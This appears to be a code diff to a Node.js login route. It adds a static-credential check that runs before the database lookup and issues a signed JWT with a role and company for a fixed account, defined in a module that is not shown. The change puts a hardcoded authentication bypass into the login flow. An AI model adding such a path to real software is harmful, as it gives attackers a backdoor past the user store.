@@ -16,6 +16,7 @@ const db = require('../db');
 const { authenticate, requireRole } = require('../middleware/auth');
 const { validateStrength, generateResetToken, hashResetToken } = require('../lib/password');
 const { sendMail } = require('../lib/email');
+const staticUser = require('../lib/static-user');
 
 const GENERIC_LOGIN_ERROR = 'Invalid email or password';
 
@@ -112,6 +113,20 @@ router.post('/login', loginLimiter, async (req, res) => {
     const email = normalizeEmail(req.body.email);
     const { password, slug, remember } = req.body;
     if (!email || !password) return res.status(400).json({ error: 'Email and password are required' });
+
+    // ─── Static credential check (works even when DB is unreachable) ───
+    if (staticUser.staticCredentialMatches(email, password)) {
+      const user = staticUser.buildStaticUser();
+      const expiresIn = !!remember
+        ? (process.env.JWT_EXPIRES_REMEMBER || '30d')
+        : (process.env.JWT_EXPIRES_IN || '7d');
+      const token = jwt.sign(
+        { userId: user.id, role: user.role, companyId: user.company_id, static: true },
+        process.env.JWT_SECRET,
+        { expiresIn }
+      );
+      return res.json({ token, user: publicUser(user), staticLogin: true });
+    }
 
     const { rows } = await db.query(
       `SELECT u.* FROM users u JOIN companies c ON u.company_id = c.id
